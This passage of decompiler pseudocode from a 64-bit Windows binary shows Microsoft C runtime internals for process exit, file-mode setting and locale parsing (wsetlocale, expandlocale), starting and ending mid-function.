        && *((_DWORD *)v5 + 33) > 0xEu
        && *((_DWORD *)v5 + 62) != 0 )
      {
        try_cor_exit_process(a1);
      }
    }
  }
  v15 = 0;
  v12[0] = &v13;
  v12[1] = &v14;
  v12[2] = &v15;
  v9 = 2;
  v10 = 2;
  __wind
  {
    __crt_seh_guarded_call<void>::operator()<_lambda_99476a1ad63dd22509b5d3e65b0ffc95_,_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ &,_lambda_f7424dd8d45958661754dc4f2697e9c3_>(
      (__int64)v8,
      &v10,
      (__int64)v12,
      &v9);
    if ( v14 == _crt_exit_terminate_process )
    {
      if ( (unsigned int)_acrt_get_process_end_policy() != 1 )
        _acrt_app_verifier_enabled();
      if ( v14 == _crt_exit_terminate_process )
        sub_1400197B0(a1);
    }
  }
  __unwind
  {
    sub_14001BA28(v6, &v7);
  }
}


// ----- sub_1400197B0 @ 0x1400197b0 -----
void __fastcall __noreturn sub_1400197B0(UINT a1, char a2)
{
  HANDLE CurrentProcess; // rax

  if ( a2 != 0 )
  {
    CurrentProcess = GetCurrentProcess();
    TerminateProcess(CurrentProcess, a1);
  }
  try_cor_exit_process(a1);
  ExitProcess(a1);
}


// ----- ?try_cor_exit_process@@YAXI@Z @ 0x1400197e0 -----
void __fastcall try_cor_exit_process(unsigned int a1)
{
  BOOL ModuleHandle; // eax
  HMODULE v3; // rcx
  FARPROC CorExitProcess; // rax
  HMODULE phModule; // [rsp+48h] [rbp+10h] BYREF

  phModule = nullptr;
  ModuleHandle = GetModuleHandleExW(0, L"mscoree.dll", &phModule);
  v3 = phModule;
  if ( ModuleHandle )
  {
    CorExitProcess = GetProcAddress(phModule, "CorExitProcess");
    if ( CorExitProcess != nullptr )
      ((void (__fastcall *)(_QWORD))CorExitProcess)(a1);
    v3 = phModule;
  }
  if ( v3 != nullptr )
    FreeLibrary(v3);
}


// ----- sub_140019844 @ 0x140019844 -----
void __fastcall sub_140019844(__int64 a1)
{
  qword_1400A0520 = a1;
}


// ----- sub_14001984C @ 0x14001984c -----
void sub_14001984C()
{
  common_exit(0, _crt_exit_no_cleanup, _crt_exit_return_to_caller);
}


// ----- _cexit @ 0x14001985c -----
void __cdecl cexit()
{
  common_exit(0, _crt_exit_full_cleanup, _crt_exit_return_to_caller);
}


// ----- _exit @ 0x14001986c -----
void __cdecl __noreturn exit(int Code)
{
  common_exit(Code, _crt_exit_no_cleanup, _crt_exit_terminate_process);
}


// ----- sub_140019878 @ 0x140019878 -----
uintptr_t __fastcall sub_140019878(__int64 a1)
{
  uintptr_t result; // rax

  if ( qword_1400A0520 != _security_cookie )
    sub_14001BA28(a1, a1);
  result = _security_cookie & 0x3F;
  qword_1400A0520 = _security_cookie ^ __ROR8__(a1, 64 - (unsigned __int8)result);
  return result;
}


// ----- exit @ 0x1400198b4 -----
void __cdecl __noreturn exit(int Code)
{
  common_exit(Code, _crt_exit_full_cleanup, _crt_exit_terminate_process);
}


// ----- _get_fmode @ 0x1400198c0 -----
errno_t __cdecl get_fmode(int *PMode)
{
  if ( PMode != nullptr )
  {
    *PMode = dword_1400A0BD0;
    return 0;
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
}


// ----- _set_fmode @ 0x1400198f0 -----
errno_t __cdecl set_fmode(int Mode)
{
  if ( ((Mode - 0x4000) & 0xFFFF3FFF) != 0 || Mode == 49152 )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  else
  {
    _InterlockedExchange(&dword_1400A0BD0, Mode);
    return 0;
  }
}


// ----- _setmode_nolock @ 0x140019930 -----
__int64 __fastcall setmode_nolock(int a1, int a2)
{
  __int64 v3; // r9
  __int64 v4; // rax
  __int64 v5; // rdx
  char v6; // cl
  char v7; // r11
  __int64 result; // rax

  v3 = (__int64)a1 >> 6;
  v4 = a1 & 0x3F;
  v5 = qword_1400A0680[v3];
  v6 = *(_BYTE *)(v5 + 72 * v4 + 56);
  v7 = *(_BYTE *)(v5 + 72 * v4 + 57);
  if ( a2 == 0x4000 )
  {
    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;
    *(_BYTE *)(qword_1400A0680[v3] + 72 * v4 + 57) = 0;
  }
  else if ( a2 == 0x8000 )
  {
    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 & 0x7F;
  }
  else if ( ((a2 - 0x10000) & 0xFFFEFFFF) != 0 )
  {
    if ( a2 == 0x40000 )
    {
      *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;
      *(_BYTE *)(qword_1400A0680[v3] + 72 * v4 + 57) = 1;
    }
  }
  else
  {
    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;
    *(_BYTE *)(qword_1400A0680[v3] + 72 * v4 + 57) = 2;
  }
  if ( (v6 & 0x80) == 0 )
    return 0x8000;
  if ( v7 == 0 )
    return 0x4000;
  result = 0x10000;
  if ( v7 == 1 )
    return 0x40000;
  return result;
}


// ----- __acrt_initialize_command_line @ 0x140019a14 -----
char _acrt_initialize_command_line()
{
  qword_1400A0550 = (__int64)GetCommandLineA();
  qword_1400A0558 = (__int64)GetCommandLineW();
  return 1;
}


// ----- sub_140019A3C @ 0x140019a3c -----
int *sub_140019A3C()
{
  return &dword_1400A0538;
}


// ----- sub_140019A44 @ 0x140019a44 -----
void **sub_140019A44()
{
  return &qword_1400A0540;
}


// ----- ??$?RV_lambda_d67e8342c384adda8f857579ab50b2ae_@@AEAV_lambda_30712929f77e709619002f448b6a9510_@@V_lambda_4525336fd7e478d965fb7ca7a337cad8_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_d67e8342c384adda8f857579ab50b2ae_@@AEAV_lambda_30712929f77e709619002f448b6a9510_@@$$QEAV_lambda_4525336fd7e478d965fb7ca7a337cad8_@@@Z @ 0x140019a4c -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_d67e8342c384adda8f857579ab50b2ae_,_lambda_30712929f77e709619002f448b6a9510_ &,_lambda_4525336fd7e478d965fb7ca7a337cad8_>(
        __int64 a1,
        int *a2,
        void ***a3,
        int *a4)
{
  __int64 v6; // rax
  void *v7; // rcx
  char *v8; // r8
  int v9; // edx
  int v10; // eax
  void **v11; // rax

  _vcrt_lock(*a2);
  copytlocinfo_nolock(**a3, *((_QWORD *)*a3[1] + 18));
  v6 = wsetlocale_nolock(**a3, *(unsigned int *)a3[3], *a3[4]);
  *a3[2] = (void *)v6;
  if ( v6 != 0 )
  {
    v7 = *a3[4];
    if ( v7 != nullptr )
    {
      v8 = (char *)(&unk_14009ECB8 - (_UNKNOWN *)v7);
      do
      {
        v9 = *(unsigned __int16 *)&v8[(_QWORD)v7];
        v10 = *(unsigned __int16 *)v7 - v9;
        if ( v10 != 0 )
          break;
        v7 = (char *)v7 + 2;
      }
      while ( v9 != 0 );
      if ( v10 != 0 )
        _InterlockedExchange(&dword_1400A0560, 1);
    }
    updatetlocinfoEx_nolock((char *)*a3[1] + 144, **a3);
    _acrt_release_locale_ref(**a3);
    v11 = a3[1];
    if ( (*((_BYTE *)*v11 + 936) & 2) == 0 && (dword_14009EE10 & 1) == 0 )
    {
      updatetlocinfoEx_nolock(&qword_1400A05B0, *((_QWORD *)*v11 + 18));
      off_14009EB18 = *(_UNKNOWN ***)(qword_1400A05B0 + 248);
      off_14009EA60 = *(wchar_t **)qword_1400A05B0;
      dword_14009ECBC = *(_DWORD *)(qword_1400A05B0 + 8);
    }
  }
  else
  {
    _acrt_release_locale_ref(**a3);
    _acrt_free_locale(**a3);
  }
  _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_9431c60049192bb82166e0947f95a2e9_@@AEAV_lambda_85fa512c59a4d94d4a89f575eefd92a6_@@V_lambda_487febba6ca58d9ce348204d67e1dba3_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_9431c60049192bb82166e0947f95a2e9_@@AEAV_lambda_85fa512c59a4d94d4a89f575eefd92a6_@@$$QEAV_lambda_487febba6ca58d9ce348204d67e1dba3_@@@Z @ 0x140019b88 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_9431c60049192bb82166e0947f95a2e9_,_lambda_85fa512c59a4d94d4a89f575eefd92a6_ &,_lambda_487febba6ca58d9ce348204d67e1dba3_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  __int64 *i; // rbx

  _vcrt_lock(*a2);
  for ( i = &qword_1400A05B0; i != &qword_1400A05B8; ++i )
  {
    if ( (wchar_t **)*i != &off_14009EB50 )
      *i = updatetlocinfoEx_nolock(i, &off_14009EB50);
  }
  _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_5df02c53a8f32f81fd64e5bbb78039f1_@@AEAV_lambda_2af78c5f5901b1372d98f9ab3177dfa6_@@AEAV_lambda_f51fe5fd7c79a33db34fc9310f277369_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_5df02c53a8f32f81fd64e5bbb78039f1_@@AEAV_lambda_2af78c5f5901b1372d98f9ab3177dfa6_@@AEAV_lambda_f51fe5fd7c79a33db34fc9310f277369_@@@Z @ 0x140019bf8 -----
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_5df02c53a8f32f81fd64e5bbb78039f1_,_lambda_2af78c5f5901b1372d98f9ab3177dfa6_ &,_lambda_f51fe5fd7c79a33db34fc9310f277369_ &>(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 *a4)
{
  __int64 result; // rax

  _lambda_2a444430fde8c29194d880d93eed5e8f_::operator()(a3);
  result = *a4;
  *(_DWORD *)(*(_QWORD *)*a4 + 936LL) &= ~0x10u;
  return result;
}


// ----- ??R_lambda_2a444430fde8c29194d880d93eed5e8f_@@QEBA@XZ @ 0x140019c24 -----
void __fastcall _lambda_2a444430fde8c29194d880d93eed5e8f_::operator()(_QWORD **a1)
{
  void *v2; // rbx
  void **v3[7]; // [rsp+20h] [rbp-38h] BYREF
  char v4; // [rsp+60h] [rbp+8h] BYREF
  int v5; // [rsp+68h] [rbp+10h] BYREF
  int v6; // [rsp+70h] [rbp+18h] BYREF

  v2 = calloc_base(1u, 0x158u);
  **a1 = v2;
  free_base(nullptr);
  if ( v2 != nullptr )
  {
    qmemcpy(v3, a1, 40);
    v5 = 4;
    v6 = 4;
    __crt_seh_guarded_call<void>::operator()<_lambda_d67e8342c384adda8f857579ab50b2ae_,_lambda_30712929f77e709619002f448b6a9510_ &,_lambda_4525336fd7e478d965fb7ca7a337cad8_>(
      (__int64)&v4,
      &v6,
      v3,
      &v5);
  }
}


// ----- ?commit_locale_name@_expandlocale_locale_name_cache@@QEAAXQEB_W_K@Z @ 0x140019cb4 -----
void __fastcall _expandlocale_locale_name_cache::commit_locale_name(
        _expandlocale_locale_name_cache *this,
        const wchar_t *a2,
        __int64 a3)
{
  if ( (unsigned int)sub_140022E30(*((_QWORD *)this + 2) + 600LL, 85, a2, a3) != 0
    || (unsigned int)sub_140022E30(*(_QWORD *)this, *((_QWORD *)this + 1), a2, a3) != 0 )
  {
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  *((_BYTE *)this + 24) = 1;
}


// ----- __acrt_copy_locale_name @ 0x140019d2c -----
void *__fastcall _acrt_copy_locale_name(_WORD *a1)
{
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rsi
  void *v4; // rax
  void *v5; // rbx

  if ( a1 == nullptr )
    return nullptr;
  v2 = sub_140017760(a1, 0x55u);
  v3 = v2;
  if ( v2 >= 0x55 )
    return nullptr;
  v4 = malloc_base(2 * v2 + 2);
  v5 = v4;
  if ( v4 == nullptr )
    return nullptr;
  if ( (unsigned int)sub_140022E30(v4, v3 + 1, a1, v3 + 1) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  return v5;
}


// ----- __acrt_set_locale_changed @ 0x140019db0 -----
__int64 _acrt_set_locale_changed()
{
  return (unsigned int)_InterlockedExchange(&dword_1400A0560, 1);
}


// ----- __acrt_uninitialize_locale @ 0x140019dbc -----
void _acrt_uninitialize_locale()
{
  __int64 v0; // [rsp+30h] [rbp+8h] BYREF
  int v1; // [rsp+38h] [rbp+10h] BYREF
  int v2; // [rsp+40h] [rbp+18h] BYREF

  v1 = 4;
  v2 = 4;
  __crt_seh_guarded_call<void>::operator()<_lambda_9431c60049192bb82166e0947f95a2e9_,_lambda_85fa512c59a4d94d4a89f575eefd92a6_ &,_lambda_487febba6ca58d9ce348204d67e1dba3_>(
    (__int64)&v0,
    &v2,
    (__int64)&v0,
    &v1);
}


// ----- __lc_lctowcs @ 0x140019dec -----
__int64 __fastcall _lc_lctowcs(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax

  if ( (unsigned int)sub_140021B30(a1, a2, a3) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  if ( *(_WORD *)(a3 + 128) != 0 )
    sub_14001A5A4(a1, a2, 2, L"_", a3 + 128);
  result = a3 + 256;
  if ( *(_WORD *)(a3 + 256) != 0 )
    return sub_14001A5A4(a1, a2, 2, L".", a3 + 256);
  return result;
}


// ----- __lc_wcstolc @ 0x140019e90 -----
__int64 __fastcall _lc_wcstolc(_WORD *a1, _WORD *a2)
{
  int i; // esi
  __int16 *v6; // r14
  __int16 v7; // di
  _WORD *v8; // rcx
  __int64 v9; // rdx
  unsigned __int64 v10; // rax

  memset(a1, 0, 0x1CAu);
  if ( *a2 == 0 )
    return 0;
  if ( *a2 == 46 && a2[1] != 0 )
  {
    if ( (unsigned int)sub_140022E30(a1 + 128, 16, a2 + 1, 15) != 0 )
LABEL_28:
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    a1[143] = 0;
    return 0;
  }
  for ( i = 0; ; ++i )
  {
    v10 = sub_140026020(a2, L"_.,");
    if ( v10 == 0 )
      break;
    v6 = &a2[v10];
    v7 = *v6;
    if ( i != 0 )
    {
      if ( i == 1 )
      {
        if ( v10 >= 0x40 || v7 == 95 )
          return 0xFFFFFFFFLL;
        v8 = a1 + 64;
        v9 = 64;
      }
      else
      {
        if ( i != 2 || v10 >= 0x10 || v7 != 0 && v7 != 44 )
          return 0xFFFFFFFFLL;
        v8 = a1 + 128;
        v9 = 16;
      }
      if ( (unsigned int)sub_140022E30(v8, v9, a2, v10) != 0 )
        goto LABEL_28;
    }
    else
    {
      if ( v10 >= 0x40 )
        return 0xFFFFFFFFLL;
      if ( (unsigned int)sub_140022E30(a1, 64, a2, v10) != 0 )
        goto LABEL_28;
      if ( v7 == 46 )
      {
        i = 1;
        goto LABEL_25;
      }
    }
    if ( v7 == 44 || v7 == 0 )
      return 0;
LABEL_25:
    a2 = v6 + 1;
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_140019FF4 @ 0x140019ff4 -----
__int64 __fastcall sub_140019FF4(int a1)
{
  __int64 v2; // rax
  int v3; // r8d
  int v4; // ecx
  unsigned int v6; // r8d

  v2 = sub_14001C7D8();
  v3 = *(_DWORD *)(v2 + 936);
  v4 = -((v3 & 2) != 0);
  if ( a1 == -1 )
  {
    dword_14009EE10 = -1;
  }
  else if ( a1 != 0 )
  {
    if ( a1 == 1 )
    {
      v6 = v3 | 2;
    }
    else
    {
      if ( a1 != 2 )
      {
        *(_DWORD *)sub_140018888() = 22;
        invalid_parameter_noinfo();
        return 0xFFFFFFFFLL;
      }
      v6 = v3 & 0xFFFFFFFD;
    }
    *(_DWORD *)(v2 + 936) = v6;
  }
  return (unsigned int)(v4 + 2);
}


// ----- _copytlocinfo_nolock @ 0x14001a060 -----
void __fastcall copytlocinfo_nolock(__int64 a1, _OWORD *a2)
{
  __int64 v2; // rax
  _OWORD *v3; // r8
  __int128 v4; // xmm1

  if ( a2 != nullptr && a1 != 0 && (_OWORD *)a1 != a2 )
  {
    v2 = 2;
    v3 = (_OWORD *)a1;
    do
    {
      *v3 = *a2;
      v3[1] = a2[1];
      v3[2] = a2[2];
      v3[3] = a2[3];
      v3[4] = a2[4];
      v3[5] = a2[5];
      v3[6] = a2[6];
      v3 += 8;
      v4 = a2[7];
      a2 += 8;
      *(v3 - 1) = v4;
      --v2;
    }
    while ( v2 != 0 );
    *v3 = *a2;
    v3[1] = a2[1];
    v3[2] = a2[2];
    v3[3] = a2[3];
    v3[4] = a2[4];
    *((_QWORD *)v3 + 10) = *((_QWORD *)a2 + 10);
    *(_DWORD *)(a1 + 16) = 0;
    _acrt_add_locale_ref(a1, a2, v3, 128);
  }
}


// ----- _expandlocale @ 0x14001a120 -----
__int64 __fastcall expandlocale(wchar_t *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, _DWORD *a6)
{
  __int64 v10; // rax
  char v11; // r14
  char *v12; // rsi
  __int64 v13; // r12
  __int64 v14; // rdi
  unsigned __int64 v15; // r15
  unsigned __int16 *v16; // rax
  int v17; // edx
  int v18; // ecx
  unsigned __int16 *v19; // rax
  int v20; // edx
  int v21; // ecx
  __vcrt_bool v22; // si
  bool v23; // zf
  _DWORD *v24; // rsi
  int v25; // eax
  unsigned __int16 v26; // ax
  __int64 v27; // r8
  const wchar_t *v28; // rdx
  int v29; // edx
  int v30; // ecx
  int v31; // ecx
  unsigned __int16 v32; // ax
  __int64 v33; // rdx
  _DWORD *v34; // [rsp+30h] [rbp-D0h] BYREF
  _WORD *v35; // [rsp+38h] [rbp-C8h]
  __int64 v36; // [rsp+40h] [rbp-C0h] BYREF
  __int64 v37; // [rsp+48h] [rbp-B8h]
  __int64 v38; // [rsp+50h] [rbp-B0h]
  char v39; // [rsp+58h] [rbp-A8h]
  __int64 v40; // [rsp+60h] [rbp-A0h]
  _DWORD *v41; // [rsp+68h] [rbp-98h]
  __int64 v42; // [rsp+70h] [rbp-90h]
  __int64 v43; // [rsp+78h] [rbp-88h]
  _QWORD v44[58]; // [rsp+80h] [rbp-80h] BYREF

  v42 = a3;
  v43 = a2;
  v40 = a5;
  v41 = a6;
  if ( a1 == nullptr )
    return 0;
  if ( *a1 == 67 && a1[1] == 0 )
  {
    if ( (unsigned int)sub_140021B30(a2, a3, L"C") == 0 )
    {
      *a6 = 0;
      return a2;
    }
LABEL_69:
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  v10 = sub_14001C7D8();
  v36 = a4;
  v37 = a5;
  v38 = v10 + 152;
  v11 = 0;
  v39 = 0;
  v34 = (_DWORD *)(v10 + 184);
  v12 = (char *)(v10 + 188);
  v35 = (_WORD *)(v10 + 188);
  v13 = v10 + 450;
  if ( (unsigned int)sub_140022E30(a4, a5, v10 + 752, 85) != 0 )
    goto LABEL_69;
  v14 = -1;
  v15 = -1;
  do
    ++v15;
  while ( a1[v15] != 0 );
  if ( v15 < 0x83 )
  {
    v16 = (unsigned __int16 *)v13;
    do
    {
      v17 = *(unsigned __int16 *)((char *)a1 + (_QWORD)v16 - v13);
      v18 = *v16 - v17;
      if ( v18 != 0 )
        break;
      ++v16;
    }
    while ( v17 != 0 );
    if ( v18 == 0 )
      goto LABEL_67;
    v19 = (unsigned __int16 *)v12;
    do
    {
      v20 = *(unsigned __int16 *)((char *)v19 + (char *)a1 - v12);
      v21 = *v19 - v20;
      if ( v21 != 0 )
        break;
      ++v19;
    }
    while ( v20 != 0 );
    if ( v21 == 0 )
    {
LABEL_67:
      v24 = v34;
      goto LABEL_68;
    }
  }
  memset(v44, 0, 0x1CAu);
  v22 = _vcrt_thread_attach();
  if ( (unsigned int)_lc_wcstolc(v44, a1) != 0 )
  {
    v24 = v34;
    goto LABEL_29;
  }
  v23 = !v22;
  v24 = v34;
  if ( v23 )
    v25 = sub_14002773C(v44, v34, v44);
  else
    v25 = sub_140026CDC(v44, v34, v44);
  if ( v25 == 0 )
  {
LABEL_29:
    if ( (unsigned int)sub_14001D4DC(a1) != 0 )
    {
      LODWORD(v34) = 0;
      if ( (unsigned int)sub_14001D3D0(a1, 536875012, &v34, 2) == 0 || (v26 = (unsigned __int16)v34, (_DWORD)v34 == 0) )
        v26 = -535;
      *v24 = v26;
      if ( (unsigned int)sub_140022E30(v13, 131, a1, v15 + 1) != 0 )
        goto LABEL_70;
      v27 = v15 + 1;
      v28 = a1;
      goto LABEL_61;
    }
    if ( (unsigned __int8)parse_bcp47(v44, a1) == 0 || (unsigned int)sub_14001D4DC(&v44[36]) == 0 )
    {
LABEL_51:
      v13 = 0;
      goto LABEL_52;
    }
    if ( LOWORD(v44[32]) != 0 )
    {
      v29 = LOWORD(v44[32]) + 32;
      if ( (unsigned int)LOWORD(v44[32]) - 65 > 0x19 )
        v29 = LOWORD(v44[32]);
      if ( v29 != 117 )
        goto LABEL_50;
      v30 = WORD1(v44[32]) + 32;
      if ( (unsigned int)WORD1(v44[32]) - 65 > 0x19 )
        v30 = WORD1(v44[32]);
      if ( v30 != 116 )
        goto LABEL_50;
      v31 = WORD2(v44[32]) + 32;
      if ( (unsigned int)WORD2(v44[32]) - 65 > 0x19 )
        v31 = WORD2(v44[32]);
      if ( v31 != 102 || HIWORD(v44[32]) != 56 || LOWORD(v44[33]) != 0 )
      {
LABEL_50:
        if ( HIWORD(v44[32]) != 45 || LODWORD(v44[33]) != 56 )
          goto LABEL_51;
      }
    }
    else
    {
      LODWORD(v34) = 0;
      if ( (unsigned int)sub_14001D3D0(&v44[36], 536875012, &v34, 2) != 0 )
      {
        v32 = (unsigned __int16)v34;
        if ( (_DWORD)v34 != 0 )
          goto LABEL_58;
      }
    }
    v32 = -535;
LABEL_58:
    *v24 = v32;
    if ( (unsigned int)sub_140022E30(v13, 131, a1, v15 + 1) != 0 )
      goto LABEL_70;
    do
      ++v14;
    while ( *((_WORD *)&v44[36] + v14) != 0 );
    v28 = (const wchar_t *)&v44[36];
    v27 = v14 + 1;
LABEL_61:
    _expandlocale_locale_name_cache::commit_locale_name((_expandlocale_locale_name_cache *)&v36, v28, v27);
    v11 = v39;
    goto LABEL_62;
  }
  _lc_lctowcs(v13, 131, (__int64)v44);
  do
    ++v14;
  while ( *((_WORD *)&v44[36] + v14) != 0 );
  v11 = 1;
  if ( (unsigned int)sub_140022E30(a4, v40, &v44[36], v14 + 1) != 0 )
    goto LABEL_70;
LABEL_62:
  if ( *a1 == 0 || v15 >= 0x83 )
  {
    *v35 = 0;
    goto LABEL_68;
  }
  if ( (unsigned int)sub_140022E30(v35, 131, a1, v15 + 1) != 0 )
LABEL_70:
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
LABEL_68:
  v33 = v42;
  *v41 = *v24;
  if ( (unsigned int)sub_140021B30(v43, v33, v13) != 0 )
    goto LABEL_69;
LABEL_52:
  if ( v11 == 0 && (unsigned int)sub_140022E30(v38 + 600, 85, v36, v37) != 0 )
    goto LABEL_69;
  return v13;
}


// ----- sub_14001A5A4 @ 0x14001a5a4 -----
void __fastcall sub_14001A5A4(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  int v4; // ebx
  int *v5; // rdi
  int v8; // [rsp+80h] [rbp+18h] BYREF
  __int64 v9; // [rsp+88h] [rbp+20h]

  if ( a3 > 0 )
  {
    v8 = a3;
    v9 = a4;
    v4 = 0;
    v5 = &v8;
    do
    {
      v5 += 2;
      if ( (unsigned int)sub_140022DA0(a1, a2, *(_QWORD *)v5) != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      ++v4;
    }
    while ( v4 < v8 );
  }
}


// ----- _wsetlocale @ 0x14001a60c -----
wchar_t *__cdecl wsetlocale(int Category, const wchar_t *Locale)
{
  wchar_t *v3; // [rsp+20h] [rbp-40h] BYREF
  __int64 v4; // [rsp+28h] [rbp-38h] BYREF
  __int64 *v5; // [rsp+30h] [rbp-30h] BYREF
  _QWORD v6[5]; // [rsp+38h] [rbp-28h] BYREF
  int v7; // [rsp+70h] [rbp+10h] BYREF
  const wchar_t *v8; // [rsp+78h] [rbp+18h] BYREF
  char v9; // [rsp+80h] [rbp+20h] BYREF
  __int64 v10; // [rsp+88h] [rbp+28h] BYREF

  v8 = Locale;
  v7 = Category;
  v3 = nullptr;
  v4 = 0;
  if ( (unsigned int)Category <= 5 )
  {
    v10 = sub_14001C7D8();
    sub_14001D738();
    _acrt_update_thread_locale_data();
    *(_DWORD *)(v10 + 936) |= 0x10u;
    v5 = &v10;
    v6[0] = &v4;
    v6[1] = &v10;
    v6[2] = &v3;
    v6[3] = &v7;
    v6[4] = &v8;
    __crt_seh_guarded_call<void>::operator()<_lambda_5df02c53a8f32f81fd64e5bbb78039f1_,_lambda_2af78c5f5901b1372d98f9ab3177dfa6_ &,_lambda_f51fe5fd7c79a33db34fc9310f277369_ &>(
      (__int64)&v9,
      (__int64)&v9,
      (__int64)v6,
      (__int64 *)&v5);
    return v3;
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return nullptr;
  }
}


// ----- _wsetlocale_get_all @ 0x14001a6b0 -----
_DWORD *__fastcall wsetlocale_get_all(__int64 a1)
{
  int v2; // edi
  _DWORD *result; // rax
  void *v4; // rsi
  __int64 v5; // r14
  char **v6; // r15
  __int64 *v7; // rbp
  unsigned __int16 *v8; // rax
  int v9; // ecx
  int v10; // r8d
  int v11; // eax
  volatile signed __int32 *v12; // rcx
  volatile signed __int32 *v13; // rdx
  volatile signed __int32 *v14; // rcx
  volatile signed __int32 *v15; // rcx

  v2 = 1;
  result = malloc_base(0x6A6u);
  v4 = result;
  if ( result != nullptr )
  {
    v5 = (__int64)(result + 1);
    *result = 1;
    *((_WORD *)result + 2) = 0;
    v6 = (char **)(a1 + 72);
    sub_14001A5A4((__int64)(result + 1), 849, 3, (__int64)L"LC_COLLATE");
    v7 = (__int64 *)&off_140091AA8;
    do
    {
      if ( (unsigned int)sub_140022DA0(v5, 849, L";") != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      v8 = (unsigned __int16 *)*v6;
      do
      {
        v9 = *(unsigned __int16 *)((char *)v8 + v6[4] - *v6);
        v10 = *v8 - v9;
        if ( v10 != 0 )
          break;
        ++v8;
      }
      while ( v9 != 0 );
      v11 = 0;
      if ( v10 == 0 )
        v11 = v2;
      v2 = v11;
      v7 += 3;
      v6 += 4;
      sub_14001A5A4(v5, 849, 3, *v7);
    }
    while ( (__int64)v7 < (__int64)&off_140091B08 );
    if ( v2 != 0 )
    {
      free_base(v4);
      v14 = *(volatile signed __int32 **)(a1 + 56);
      if ( v14 != nullptr && _InterlockedExchangeAdd(v14, 0xFFFFFFFF) == 1 )
        free_base(*(void **)(a1 + 56));
      v15 = *(volatile signed __int32 **)(a1 + 48);
      if ( v15 != nullptr && _InterlockedExchangeAdd(v15, 0xFFFFFFFF) == 1 )
        free_base(*(void **)(a1 + 48));
      result = *(_DWORD **)(a1 + 104);
      *(_QWORD *)(a1 + 48) = 0;
      *(_QWORD *)(a1 + 32) = 0;
      *(_QWORD *)(a1 + 56) = 0;
      *(_QWORD *)(a1 + 40) = 0;
    }
    else
    {
      v12 = *(volatile signed __int32 **)(a1 + 56);
      if ( v12 != nullptr && _InterlockedExchangeAdd(v12, 0xFFFFFFFF) == 1 )
        free_base(*(void **)(a1 + 56));
      v13 = *(volatile signed __int32 **)(a1 + 48);
      if ( v13 != nullptr && _InterlockedExchangeAdd(v13, 0xFFFFFFFF) == 1 )
        free_base(*(void **)(a1 + 48));
      *(_QWORD *)(a1 + 48) = 0;
      *(_QWORD *)(a1 + 32) = 0;
      *(_QWORD *)(a1 + 56) = v4;
      *(_QWORD *)(a1 + 40) = v5;
      return (_DWORD *)v5;
    }
  }
  return result;
}


// ----- _wsetlocale_nolock @ 0x14001a89c -----
_DWORD *__fastcall wsetlocale_nolock(__int64 a1, __int64 a2, wchar_t *a3)
{
  wchar_t *v3; // rbx
  __int64 v4; // rdi
  _DWORD *result; // rax
  int v6; // ebp
  int v7; // esi
  _WORD *v8; // rax
  _WORD *v9; // r14
  __int64 v10; // rbp
  int v11; // r12d
  wchar_t **v12; // r15
  __int64 v13; // rax
  _WORD *v14; // r14
  __int64 v15; // rax
  __int64 v16; // rbx
  _WORD *v17; // rbx
  int v18; // ebx
  _QWORD *v19; // r14
  unsigned __int16 *v20; // rax
  int v21; // r8d
  int v22; // ecx
  _DWORD v23[4]; // [rsp+30h] [rbp-218h] BYREF
  _WORD v24[136]; // [rsp+40h] [rbp-208h] BYREF
  _BYTE v25[176]; // [rsp+150h] [rbp-F8h] BYREF

  v3 = a3;
  v4 = a1;
  if ( (_DWORD)a2 != 0 )
  {
    if ( a3 != nullptr )
      return (_DWORD *)sub_14001AB34(a1, a2, a3);
    else
      return *(_DWORD **)(32LL * (int)a2 + a1 + 40);
  }
  v6 = 1;
  v7 = 0;
  if ( a3 == nullptr )
    return wsetlocale_get_all(a1);
  if ( *a3 != 76 || a3[1] != 67 || a3[2] != 95 )
  {
    v23[0] = 0;
    result = (_DWORD *)expandlocale(a3, (__int64)v24, 131, (__int64)v25, 85, v23);
    if ( result == nullptr )
      return result;
    v18 = 0;
    v19 = (_QWORD *)(v4 + 40);
    do
    {
      if ( v18 != 0 )
      {
        v20 = v24;
        do
        {
          v21 = *(unsigned __int16 *)((char *)v20 + *v19 - (_QWORD)v24);
          v22 = *v20 - v21;
          if ( v22 != 0 )
            break;
          ++v20;
        }
        while ( v21 != 0 );
        if ( v22 == 0 || sub_14001AB34(v4, (unsigned int)v18, v24) != 0 )
          ++v7;
        else
          v6 = 0;
      }
      ++v18;
      v19 += 4;
    }
    while ( v18 <= 5 );
    if ( v6 == 0 )
    {
LABEL_27:
      if ( v7 == 0 )
        return nullptr;
    }
    a1 = v4;
    return wsetlocale_get_all(a1);
  }
  while ( 1 )
  {
    v8 = (_WORD *)sub_1400260C0(v3, L"=;");
